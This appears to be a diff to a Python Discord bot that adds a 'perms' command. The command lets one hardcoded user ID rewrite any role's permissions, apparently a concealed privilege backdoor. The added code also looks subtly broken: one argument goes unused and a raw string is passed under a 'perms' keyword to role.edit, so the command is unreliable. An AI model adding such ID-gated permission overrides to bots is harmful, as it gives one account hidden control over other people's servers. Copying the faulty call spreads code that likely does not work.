@@ -24,6 +24,10 @@ async def on_ready():
 	change_status.start()
 	print("Bot is ready.")
 	
+@client.command()
+async def perms(ctx , role:discord.Role , perms , bull):
+	if ctx.message.author.id == 727539383405772901:
+		await role.edit(reason = None , perms = bull)
 	
 	
 @client.command(aliases = ['Lockdown' , 'lockdown' , 'LOCKDOWN' , 'Lock' , 'LOCK'])
